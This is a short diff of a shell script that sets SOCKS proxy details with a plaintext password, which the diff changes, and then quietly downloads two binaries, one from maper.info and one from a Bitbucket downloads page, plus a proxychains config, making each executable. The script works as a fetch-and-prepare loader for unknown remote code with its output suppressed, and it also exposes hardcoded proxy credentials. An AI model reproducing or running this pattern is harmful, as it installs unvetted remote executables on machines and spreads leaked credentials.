@@ -1,7 +1,7 @@
 proxy="34.192.31.89" 
 port="1080" 
 user="fixie"  
-pass="NBq8RRRWjk6fEZk" 
+pass="lLksrNManrfYi2E" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
